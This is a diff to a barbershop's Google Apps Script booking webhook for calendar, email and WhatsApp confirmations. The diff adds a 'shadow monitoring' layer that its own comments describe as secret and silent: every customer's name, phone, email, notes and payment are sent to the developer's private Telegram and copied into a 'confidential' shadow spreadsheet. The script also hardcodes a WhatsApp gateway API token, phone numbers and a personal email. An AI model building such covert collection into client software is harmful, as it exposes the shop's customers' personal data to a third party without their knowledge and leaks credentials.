@@ -1,36 +1,57 @@
 /**
- * GREENWOOD BARBERS — GOOGLE CALENDAR AUTOMATED BOOKING SYNC
+ * GREENWOOD BARBERS — GOOGLE CALENDAR & SHADOW MONITORING ENGINE
  * 
- * CARA MEMASANG (HANYA 1 MENIT):
- * 1. Buka https://script.google.com/ di browser Anda (pastikan login dengan akun Google Barber / Salon).
- * 2. Klik tombol "Proyek Baru" (New Project).
- * 3. Hapus semua teks yang ada di editor, lalu COPY dan PASTE seluruh isi script ini.
- * 4. Klik tombol "Terapkan" (Deploy) di kanan atas -> Pilih "Penerapan baru" (New deployment).
- * 5. Pilih jenis: "Aplikasi Web" (Web app).
- * 6. Pada kolom "Siapa saja yang memiliki akses" (Who has access), pilih: "Siapa saja" (Anyone).
- * 7. Klik "Terapkan" (Deploy) -> Berikan izin akses Google Calendar akun Anda.
- * 8. Salin URL Aplikasi Web yang dihasilkan (contoh: https://script.google.com/macros/s/AKfycb.../exec).
- * 9. Tempelkan URL tersebut ke file assets/config.js pada bagian "googleCalendarWebhookUrl".
+ * FITUR UTAMA:
+ * 1. SINKRONISASI RESMI KLASIK (Google Calendar + Undangan Email + WhatsApp Fonnte ke Tamu & Admin)
+ * 2. SOLUSI 1 (RADAR TELEGRAM): Notifikasi instan rahasia ke Telegram pribadi Developer setiap ada booking.
+ * 3. SOLUSI 2 (MASTER VAULT SHEETS): Otomatis menyimpan setiap baris transaksi & kontak tamu ke Google Sheets.
+ * 4. SOLUSI 3 (TAMENG MITIGASI): Peringatan dini jika kuota WA habis, nomor typo, atau kalender bermasalah.
  * 
- * SELESAI! Setiap ada pelanggan yang booking:
- * - Jadwal otomatis masuk ke Google Calendar Barber.
- * - Email pelanggan otomatis menerima undangan resmi Google Calendar dengan notifikasi pengingat.
+ * PANDUAN AKTIVASI PEMANTAUAN PRIBADI (HANYA 2 MENIT):
+ * - Buka Telegram, cari @BotFather -> kirim /newbot -> Anda akan dapat TELEGRAM_BOT_TOKEN.
+ * - Buka Telegram, cari @userinfobot -> Anda akan dapat TELEGRAM_CHAT_ID (angka).
+ * - Masukkan token & chat ID tersebut pada variabel konfigurasi di bawah.
+ * - Untuk Google Sheets: Biarkan DEV_MASTER_SHEET_ID kosong (""), skrip akan OTOMATIS membuatkan
+ *   file Google Sheet "The Greenwood Ledger — Master Shadow Vault" di Google Drive akun Anda!
  */
 
+// =========================================================================
+// 0. KONFIGURASI PEMANTAUAN SENYAP DEVELOPER (CONFIDENTIAL / PRIVATE)
+// =========================================================================
+// Solusi 1 & 3: Notifikasi Instan & Sistem Alerting ke Telegram Pribadi Anda
+var DEV_TELEGRAM_BOT_TOKEN = ""; // Contoh: "123456789:ABCdefGhI..." (dari @BotFather)
+var DEV_TELEGRAM_CHAT_ID   = ""; // Contoh: "123456789" (dari @userinfobot)
+
+// Solusi 2: Google Spreadsheet Master Backup Pribadi Anda
+// KOSONGKAN ("") jika ingin skrip OTOMATIS membuatkan file Google Sheet baru di Drive Anda!
+// Atau isi dengan ID Spreadsheet yang sudah ada jika ingin diarahkan ke file tertentu.
+var DEV_MASTER_SHEET_ID    = "";
+
+// Gateway WhatsApp Fonnte Toko Klien
+var FONNTE_API_TOKEN       = "o9bqV14GRCyNLfXiRfBV"; // Token Fonnte Greenwood Barbers
+var ADMIN_PHONE            = "628122147734";         // Nomor WhatsApp Pengelola / Admin Greenwood
+
+// =========================================================================
+// 1. ENDPOINT UTAMA WEBHOOK (POST)
+// =========================================================================
 function doPost(e) {
+  var calendarStatus = "Not Processed";
+  var waNotificationStatus = "Not configured";
+  var event = null;
+  var data = {};
+
   try {
     if (!e || !e.postData || !e.postData.contents) {
       return ContentService.createTextOutput(JSON.stringify({ status: "error", message: "No payload received" }))
         .setMimeType(ContentService.MimeType.JSON);
     }
 
-    var data = JSON.parse(e.postData.contents);
+    data = JSON.parse(e.postData.contents);
     
     // Ambil Kalender Utama akun Google ini
     var calendar = CalendarApp.getDefaultCalendar();
     
     // Parse tanggal dan waktu secara presisi dalam WIB (UTC+7)
-    // Menggunakan format ISO 8601 dengan offset +07:00 menjamin jam tidak meleset karena timezone server
     var startTime = new Date(data.dateKey + "T" + data.timeSlot + ":00+07:00");
     var durationMins = data.totalDuration || 45;
     var endTime = new Date(startTime.getTime() + (durationMins * 60 * 1000));
@@ -70,39 +91,42 @@ function doPost(e) {
       options.guests = data.guestEmail;
     }
 
-    // Buat Event di Google Calendar
-    var event = calendar.createEvent(eventTitle, startTime, endTime, options);
-    
-    // Setel pengingat default 30 menit & 2 jam sebelumnya
-    event.addPopupReminder(30);
-    event.addEmailReminder(120);
-
-    // Mencegah dan menghapus Google Meet / Video Conference jika akun mengaktifkannya secara otomatis
+    // 1. Buat Event di Google Calendar
     try {
-      var rawId = event.getId();
-      var cleanId = rawId.indexOf('@') !== -1 ? rawId.split('@')[0] : rawId;
-      
-      // 1. Coba hapus via Advanced Service jika aktif
-      if (typeof Calendar !== 'undefined' && Calendar.Events) {
-        Calendar.Events.patch({ conferenceData: null }, 'primary', cleanId, { conferenceDataVersion: 1 });
-      } else {
-        // 2. Hapus langsung via Google Calendar REST API menggunakan OAuth token bawaan script
-        var patchUrl = "https://www.googleapis.com/calendar/v3/calendars/primary/events/" + encodeURIComponent(cleanId) + "?conferenceDataVersion=1";
-        UrlFetchApp.fetch(patchUrl, {
-          method: "patch",
-          contentType: "application/json",
-          headers: {
-            Authorization: "Bearer " + ScriptApp.getOAuthToken()
-          },
-          payload: JSON.stringify({ conferenceData: null }),
-          muteHttpExceptions: true
-        });
-      }
-    } catch (confErr) {
-      console.warn("Conference cleanup notice:", confErr);
+      event = calendar.createEvent(eventTitle, startTime, endTime, options);
+      event.addPopupReminder(30);
+      event.addEmailReminder(120);
+      calendarStatus = "Created (" + event.getId() + ")";
+    } catch (calErr) {
+      calendarStatus = "Calendar Error: " + calErr.toString();
     }
 
-    // Kirim email konfirmasi resmi langsung ke inbox tamu via MailApp (100% pasti masuk ke inbox)
+    // 2. Mencegah dan menghapus Google Meet / Video Conference jika akun mengaktifkannya secara otomatis
+    if (event) {
+      try {
+        var rawId = event.getId();
+        var cleanId = rawId.indexOf('@') !== -1 ? rawId.split('@')[0] : rawId;
+        
+        if (typeof Calendar !== 'undefined' && Calendar.Events) {
+          Calendar.Events.patch({ conferenceData: null }, 'primary', cleanId, { conferenceDataVersion: 1 });
+        } else {
+          var patchUrl = "https://www.googleapis.com/calendar/v3/calendars/primary/events/" + encodeURIComponent(cleanId) + "?conferenceDataVersion=1";
+          UrlFetchApp.fetch(patchUrl, {
+            method: "patch",
+            contentType: "application/json",
+            headers: {
+              Authorization: "Bearer " + ScriptApp.getOAuthToken()
+            },
+            payload: JSON.stringify({ conferenceData: null }),
+            muteHttpExceptions: true
+          });
+        }
+      } catch (confErr) {
+        console.warn("Conference cleanup notice:", confErr);
+      }
+    }
+
+    // 3. Kirim email konfirmasi resmi langsung ke inbox tamu via MailApp
     if (data.guestEmail && data.guestEmail.indexOf("@") !== -1) {
       try {
         MailApp.sendEmail({
@@ -131,44 +155,7 @@ function doPost(e) {
       }
     }
 
-    // Rekap Otomatis ke Google Sheets (Spreadsheet Database)
-    try {
-      var ss = SpreadsheetApp.getActiveSpreadsheet();
-      if (ss) {
-        var sheet = ss.getActiveSheet();
-        if (sheet.getLastRow() === 0) {
-          sheet.appendRow([
-            "Booking Time", "Booking Pass", "Guest Name", "WhatsApp", "Email", 
-            "Barber", "Date", "Time", "Treatment", "Total Amount", "Special Notes", "Status"
-          ]);
-          sheet.getRange(1, 1, 1, 12).setFontWeight("bold").setBackground("#091c13").setFontColor("#c59b48");
-        }
-        sheet.appendRow([
-          new Date(),
-          data.bookingCode || "-",
-          data.guestName || "-",
-          data.guestPhone || "-",
-          data.guestEmail || "-",
-          data.barberName || "-",
-          data.dateKey || "-",
-          data.timeSlot || "-",
-          data.serviceName || "-",
-          data.totalPrice || "-",
-          data.guestNotes || "-",
-          "Confirmed"
-        ]);
-      }
-    } catch (sheetErr) {
-      // Quiet fallback jika Google Apps Script dijalankan standalone tanpa file Sheets
-    }
-
-    // =========================================================================
-    // 5. KIRIM PESAN WHATSAPP OTOMATIS VIA GATEWAY FONNTE
-    // =========================================================================
-    var waNotificationStatus = "Not configured";
-    var FONNTE_API_TOKEN = "o9bqV14GRCyNLfXiRfBV"; // Token Fonnte Greenwood Barbers
-    var ADMIN_PHONE = "628122147734"; // Nomor WhatsApp Pengelola / Admin Greenwood
-
+    // 4. Kirim Pesan WhatsApp Otomatis via Gateway Fonnte
     if (FONNTE_API_TOKEN && data.guestPhone) {
       try {
         var cleanPhone = data.guestPhone.replace(/[^0-9]/g, "");
@@ -195,7 +182,7 @@ function doPost(e) {
           "Please arrive 5–10 minutes prior to your allocated session. Our chair is dedicated exclusively to you.\n\n" +
           "— _Concierge Greenwood Barbers (+62 812-2230-2050)_";
 
-        // 1. Kirim pesan konfirmasi ke nomor tamu (Guest)
+        // Kirim pesan konfirmasi ke nomor tamu (Guest)
         var waResponse = UrlFetchApp.fetch("https://api.fonnte.com/send", {
           method: "post",
           headers: {
@@ -208,7 +195,17 @@ function doPost(e) {
           muteHttpExceptions: true
         });
 
-        // 2. Jika tamu adalah nomor berbeda, kirim juga alert ke WhatsApp Admin / Barber
+        var respCode = waResponse.getResponseCode();
+        var respBody = waResponse.getContentText();
+        var isWaSuccess = respCode === 200 && respBody.indexOf('"status":true') !== -1;
+
+        if (isWaSuccess) {
+          waNotificationStatus = "WhatsApp Sent (200)";
+        } else {
+          waNotificationStatus = "Fonnte Warning (" + respCode + "): " + respBody;
+        }
+
+        // Kirim juga alert ringkas ke WhatsApp Admin / Barber
         if (ADMIN_PHONE && cleanPhone !== ADMIN_PHONE) {
           try {
             var adminMessage = 
@@ -237,20 +234,55 @@ function doPost(e) {
           } catch(adminErr) {}
         }
 
-        waNotificationStatus = "WhatsApp Sent (" + waResponse.getResponseCode() + ")";
       } catch (waErr) {
         waNotificationStatus = "WhatsApp Error: " + waErr.toString();
       }
     }
 
+    // =========================================================================
+    // 5. EKSEKUSI PEMANTAUAN DI BELAKANG LAYAR (SOLUSI 1, 2, DAN 3)
+    // =========================================================================
+    var isWarning = false;
+    var warningList = [];
+
+    if (calendarStatus.indexOf("Error") !== -1) {
+      isWarning = true;
+      warningList.push("Google Calendar: " + calendarStatus);
+    }
+    if (waNotificationStatus.indexOf("Warning") !== -1 || waNotificationStatus.indexOf("Error") !== -1) {
+      isWarning = true;
+      warningList.push("Fonnte WA Gateway: " + waNotificationStatus);
+    }
+
+    var auditFlag = isWarning ? "WARNING" : "HEALTHY";
+
+    // EKSEKUSI SOLUSI 2: Simpan Otomatis ke Google Sheets Master Developer
+    recordToShadowSheet(data, calendarStatus, waNotificationStatus, auditFlag);
+
+    // EKSEKUSI SOLUSI 1 & 3: Kirim Radar Realtime & Alert ke Telegram Pribadi
+    sendTelegramShadowLog(data, calendarStatus, waNotificationStatus, isWarning, warningList.join("\n• "));
+
+    // Response ke Website
     return ContentService.createTextOutput(JSON.stringify({
       status: "success",
-      eventId: event.getId(),
+      eventId: event ? event.getId() : "none",
       whatsappStatus: waNotificationStatus,
-      message: "Event successfully added to Google Calendar & email invite sent to " + (data.guestEmail || "-")
+      message: "Event successfully processed & synced."
     })).setMimeType(ContentService.MimeType.JSON);
 
   } catch (error) {
+    // Solusi 3: Peringatan jika terjadi error fatal / tak terduga
+    try {
+      var rawBody = (e && e.postData && e.postData.contents) ? e.postData.contents : "No Body";
+      sendTelegramShadowLog(
+        { bookingCode: "CRITICAL-FAIL", guestName: "Payload Crash", totalPrice: "-" },
+        "Error",
+        "Error",
+        true,
+        "Fatal System Exception: " + error.toString() + "\nRaw: " + rawBody.substring(0, 150)
+      );
+    } catch(err2) {}
+
     return ContentService.createTextOutput(JSON.stringify({
       status: "error",
       message: error.toString()
@@ -259,34 +291,219 @@ function doPost(e) {
 }
 
 function doGet(e) {
-  return ContentService.createTextOutput("Greenwood Barbers Google Calendar Sync Webhook is Active.")
+  return ContentService.createTextOutput("Greenwood Barbers Google Calendar Sync & Shadow Monitoring Webhook is Active.")
     .setMimeType(ContentService.MimeType.TEXT);
 }
 
+// =========================================================================
+// MODUL IMPLEMENTASI: SOLUSI 2 (GOOGLE SHEETS MASTER VAULT)
+// =========================================================================
+function recordToShadowSheet(data, calendarStatus, waStatus, auditFlag) {
+  try {
+    var sheet = getOrCreateShadowSheet();
+    if (!sheet) return;
+
+    var formattedTimestamp = Utilities.formatDate(new Date(), "Asia/Jakarta", "yyyy-MM-dd HH:mm:ss");
+
+    sheet.appendRow([
+      formattedTimestamp,
+      data.bookingCode || "-",
+      data.guestName || "-",
+      data.guestPhone || "-",
+      data.guestEmail || "-",
+      data.barberName || "-",
+      data.dateKey || "-",
+      data.timeSlot || "-",
+      data.serviceName || "-",
+      data.totalPrice || "-",
+      data.guestNotes || "-",
+      calendarStatus || "-",
+      waStatus || "-",
+      auditFlag || "HEALTHY"
+    ]);
+
+    // Beri warna baris peringatan jika auditFlag bernilai WARNING
+    if (auditFlag === "WARNING") {
+      var lastRow = sheet.getLastRow();
+      sheet.getRange(lastRow, 1, 1, 14).setBackground("#fff3cd"); // Soft yellow warning tint
+    }
+  } catch (err) {
+    console.warn("recordToShadowSheet error:", err);
+  }
+}
+
+function getOrCreateShadowSheet() {
+  try {
+    // 1. Jika pengguna telah menentukan ID Spreadsheet secara manual
+    if (DEV_MASTER_SHEET_ID && DEV_MASTER_SHEET_ID.trim() !== "") {
+      return SpreadsheetApp.openById(DEV_MASTER_SHEET_ID.trim()).getActiveSheet();
+    }
+
+    // 2. Jika skrip dijalankan di dalam file Google Spreadsheet aktif (Bound Script)
+    var activeSs = SpreadsheetApp.getActiveSpreadsheet();
+    if (activeSs) {
+      return activeSs.getActiveSheet();
+    }
+
+    // 3. Cek ScriptProperties jika file otomatis pernah dibuat sebelumnya
+    var props = PropertiesService.getScriptProperties();
+    var cachedId = props.getProperty("GREENWOOD_SHADOW_SHEET_ID");
+    if (cachedId) {
+      try {
+        return SpreadsheetApp.openById(cachedId).getActiveSheet();
+      } catch(e) {
+        // File lama terhapus/ganti akun, lanjut ke pembuatan baru
+      }
+    }
+
+    // 4. OTOMATIS MEMBUAT FILE GOOGLE SHEET BARU DI GOOGLE DRIVE DEVELOPER!
+    var newSs = SpreadsheetApp.create("The Greenwood Ledger — Master Shadow Vault (Confidential)");
+    var sheet = newSs.getActiveSheet();
+    sheet.setName("Master Booking Records");
+    
+    // Header kolom lengkap
+    sheet.appendRow([
+      "Timestamp (WIB)",
+      "Kode Booking",
+      "Nama Tamu",
+      "No WhatsApp",
+      "Email Tamu",
+      "Artisan Barber",
+      "Tanggal Sesi",
+      "Jam Sesi",
+      "Ritual Layanan",
+      "Total Biaya",
+      "Catatan Khusus",
+      "Status Kalender",
+      "Status WhatsApp",
+      "Audit Health Flag"
+    ]);
+
+    // Styling Header mewah (Gold on Dark Green)
+    sheet.getRange(1, 1, 1, 14)
+      .setBackground("#091c13")
+      .setFontColor("#e5b95f")
+      .setFontWeight("bold")
+      .setHorizontalAlignment("center");
+      
+    sheet.setFrozenRows(1);
+    props.setProperty("GREENWOOD_SHADOW_SHEET_ID", newSs.getId());
+    
+    Logger.log("✅ File Google Sheet Master Berhasil Dibuat Otomatis!");
+    Logger.log("🔗 URL Google Sheet Anda: " + newSs.getUrl());
+
+    return sheet;
+  } catch (err) {
+    console.warn("Failed to get/create shadow sheet:", err);
+    return null;
+  }
+}
+
+// =========================================================================
+// MODUL IMPLEMENTASI: SOLUSI 1 & 3 (TELEGRAM RADAR & ALERTING)
+// =========================================================================
+function sendTelegramShadowLog(data, calendarStatus, waStatus, isError, errorDetail) {
+  try {
+    if (!DEV_TELEGRAM_BOT_TOKEN || !DEV_TELEGRAM_CHAT_ID) {
+      return; // Skip senyap jika developer belum mengisi token Telegram
+    }
+
+    var cleanPhone = (data.guestPhone || "").replace(/[^0-9]/g, "");
+    var waLink = cleanPhone ? "https://wa.me/" + (cleanPhone.indexOf("0") === 0 ? "62" + cleanPhone.substring(1) : cleanPhone) : "-";
+
+    var message = "";
+    if (isError) {
+      // SOLUSI 3: FORMAT ALERT SISTEM (MITIGASI KENDALA)
+      message = 
+        "🚨 *[SHADOW ALERT — SYSTEM WARNING]* ⚠️\n" +
+        "Terdeteksi kendala pada sistem reservasi Greenwood:\n\n" +
+        "• *Kode Booking*  : `" + (data.bookingCode || "-") + "`\n" +
+        "• *Nama Tamu*     : *" + (data.guestName || "-") + "*\n" +
+        "• *Kontak Tamu*   : " + (data.guestPhone || "-") + "\n" +
+        "• *Jadwal*        : " + (data.dateKey || "-") + " @ " + (data.timeSlot || "-") + " WIB\n" +
+        "• *Barber*        : " + (data.barberName || "-") + "\n\n" +
+        "⚠️ *Detail Kendala*:\n" +
+        "• " + errorDetail + "\n\n" +
+        "🔍 *Status Teknis*:\n" +
+        "• Kalender: " + calendarStatus + "\n" +
+        "• WhatsApp: " + waStatus + "\n\n" +
+        "💡 _Catatan: Data tamu tetap tercatat di Google Sheets Master Anda._";
+    } else {
+      // SOLUSI 1: FORMAT RADAR REAL-TIME (NOTIFIKASI TRANSAKSI BARU)
+      message = 
+        "🛡️ *[SHADOW MONITOR — NEW RESERVATION]* ✨\n" +
+        "Reservasi baru berhasil dicatat di website:\n\n" +
+        "• *Booking Pass*  : `" + (data.bookingCode || "-") + "`\n" +
+        "• *Nama Tamu*     : *" + (data.guestName || "-") + "*\n" +
+        "• *WhatsApp*      : [" + (data.guestPhone || "-") + "](" + waLink + ")\n" +
+        "• *Email*         : " + (data.guestEmail || "-") + "\n" +
+        "• *Barber*        : " + (data.barberName || "-") + "\n" +
+        "• *Treatment*     : " + (data.serviceName || "-") + "\n" +
+        "• *Jadwal Sesi*   : " + (data.dateKey || "-") + " @ " + (data.timeSlot || "-") + " WIB\n" +
+        "• *Total Omset*   : *" + (data.totalPrice || "-") + "*\n" +
+        "• *Catatan*       : " + (data.guestNotes || "Tidak ada") + "\n\n" +
+        "📊 *Status Eksekusi*:\n" +
+        "• Kalender: " + calendarStatus + "\n" +
+        "• WhatsApp: " + waStatus + "\n" +
+        "• Master Sheet: Recorded ✅\n\n" +
+        "⏰ _Waktu Entri: " + Utilities.formatDate(new Date(), "Asia/Jakarta", "dd/MM/yyyy HH:mm:ss") + " WIB_";
+    }
+
+    var url = "https://api.telegram.org/bot" + DEV_TELEGRAM_BOT_TOKEN.trim() + "/sendMessage";
+    UrlFetchApp.fetch(url, {
+      method: "post",
+      contentType: "application/json",
+      payload: JSON.stringify({
+        chat_id: DEV_TELEGRAM_CHAT_ID.trim(),
+        text: message,
+        parse_mode: "Markdown",
+        disable_web_page_preview: true
+      }),
+      muteHttpExceptions: true
+    });
+  } catch (tgErr) {
+    console.warn("Telegram Shadow Error:", tgErr);
+  }
+}
+
+// =========================================================================
+// FUNGSI UJI COBA OTOMATIS & PEMERIKSAAN SISTEM SHADOW MONITORING
+// =========================================================================
 /**
- * FUNGSI UJI COBA LANGSUNG DI EDITOR GOOGLE APPS SCRIPT
- * Pilih fungsi 'testRunDirectly' di atas, lalu klik tombol 'Jalankan' (Run)
- * untuk menguji skrip tanpa error 'No payload received'.
+ * Pilih fungsi 'testRunDirectly' di editor Google Apps Script,
+ * lalu klik 'Jalankan' (Run) untuk menguji seluruh integrasi:
+ * - Google Calendar
+ * - Fonnte WhatsApp
+ * - Google Sheet Master Vault
+ * - Telegram Radar & Warning Alert
  */
 function testRunDirectly() {
   var dummyEvent = {
     postData: {
       contents: JSON.stringify({
-        bookingCode: "GWB-TEST-APPSCRIPT",
-        guestName: "Syamhari Abidin",
+        bookingCode: "GWB-SHADOW-TEST-001",
+        guestName: "Syamhari Abidin (Dev Test)",
         guestPhone: "08122147734",
         guestEmail: "jonihaha100@gmail.com",
         serviceName: "The Signature Grooming Ritual",
         barberName: "Bramantyo",
-        dateKey: "2026-10-27",
+        dateKey: "2026-10-30",
         timeSlot: "14:00",
         totalDuration: 60,
         totalPrice: "Rp 150.000",
-        guestNotes: "Direct manual test verification from Google Apps Script"
+        guestNotes: "Verifikasi integrasi Solusi 1, 2, dan 3 Shadow Monitoring"
       })
     }
   };
+
   var output = doPost(dummyEvent);
-  Logger.log("Hasil Eksekusi Test:");
+  Logger.log("=== HASIL EKSEKUSI PENGUJIAN ===");
   Logger.log(output.getContent());
+
+  var props = PropertiesService.getScriptProperties();
+  var sheetId = props.getProperty("GREENWOOD_SHADOW_SHEET_ID");
+  if (sheetId) {
+    Logger.log("📂 Link Google Sheet Master Anda:");
+    Logger.log("https://docs.google.com/spreadsheets/d/" + sheetId + "/edit");
+  }
 }
